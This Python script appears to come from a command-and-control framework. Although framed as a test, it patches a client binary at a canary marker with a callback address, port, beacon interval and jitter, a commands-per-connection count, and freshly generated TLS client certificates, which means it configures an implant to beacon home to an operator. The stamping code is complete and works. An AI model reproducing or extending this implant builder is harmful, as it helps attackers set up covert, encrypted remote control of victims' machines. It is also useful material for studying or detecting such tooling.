from rk800.tls_cert import RK800CertStore
from pathlib import Path
import struct
import argparse


class ConfigTest:
    CLIENT_CANARY = b"\x41\x39\x31\x54\x21\xff\x3d\xc1\x7a\x45\x1b\x4e\x31\x5d\x36\xc1"
    CLIENT_FORMAT = "!HHQqq256s2048s2048s2048s"
    SEC_IN_MIN = 60
    SANITY = 1987
    
    def __init__(self):
        self.cert_manager = RK800CertStore(MockContext())
    
    def _pack_client_config(self, address: str, port: int, beacon_interval: int, 
                           beacon_jitter: int, connection_weight: int) -> bytes:
        beacon_interval_seconds = beacon_interval * self.SEC_IN_MIN
        beacon_jitter_seconds = beacon_jitter * self.SEC_IN_MIN
        
        client_certs = self.cert_manager.generate_client_cert()
        
        return struct.pack(
            self.CLIENT_FORMAT,
            self.SANITY,
            port,
            beacon_interval_seconds,
            beacon_jitter_seconds,
            connection_weight,
            address.encode("utf-8"),
            client_certs["client_key"].encode("utf-8"),
            client_certs["client_cert"].encode("utf-8"),
            client_certs["ca_cert"].encode("utf-8"),
        )
    
    def stamp_binary(self, binary_path: Path, output_path: Path, address: str, 
                    port: int, beacon_interval: int = 5, beacon_jitter: int = 2, 
                    connection_weight: int = 100) -> None:
        with binary_path.open('rb') as input_file:
            data = bytearray(input_file.read())
        
        canary_index = data.find(self.CLIENT_CANARY)
        if canary_index == -1:
            raise ValueError(f"CLIENT_CANARY not found in binary: {binary_path}")
        
        packed_config = self._pack_client_config(address, port, beacon_interval, 
                                                beacon_jitter, connection_weight)
        config_size = len(packed_config)
        expected_size = struct.calcsize(self.CLIENT_FORMAT)
        
        if config_size != expected_size:
            raise ValueError(f"Config size mismatch: got {config_size}, expected {expected_size}")
        
        if canary_index + config_size > len(data):
            raise ValueError(f"Not enough space in binary for config data")
        
        data[canary_index:canary_index + config_size] = packed_config
        
        with output_path.open('wb') as output_file:
            output_file.write(bytes(data))
        
        print(f"Binary configured: {output_path}")


class MockContext:
    def __init__(self):
        self.view = MockView()

class MockView:
    def info(self, msg):
        print(f"INFO: {msg}")
    
    def success(self, msg):
        print(f"SUCCESS: {msg}")


def main():
    parser = argparse.ArgumentParser(description="Configure test client binary")
    parser.add_argument("-b", "--binary", default="test_bins/client_test.bin", help="Input binary path")
    parser.add_argument("-o", "--output", default="test_bins/configured_client.bin", help="Output binary path")
    parser.add_argument("-a", "--address", required=True, help="REQUIRED: callback address")
    parser.add_argument("-p", "--port", type=int, required=True, help="REQUIRED: callback port")
    parser.add_argument("-i", "--beacon-interval", type=int, default=5, 
                       help="beacon interval in minutes, default: 5")
    parser.add_argument("-j", "--beacon-jitter", type=int, default=2,
                       help="beacon jitter in minutes, default: 2")
    parser.add_argument("-w", "--connection-weight", type=int, default=100,
                       help="commands per connection, default: 100")
    
    args = parser.parse_args()
    
    config_test = ConfigTest()
    config_test.stamp_binary(
        Path(args.binary),
        Path(args.output),
        args.address,
        args.port,
        args.beacon_interval,
        args.beacon_jitter,
        args.connection_weight
    )


if __name__ == "__main__":
    main()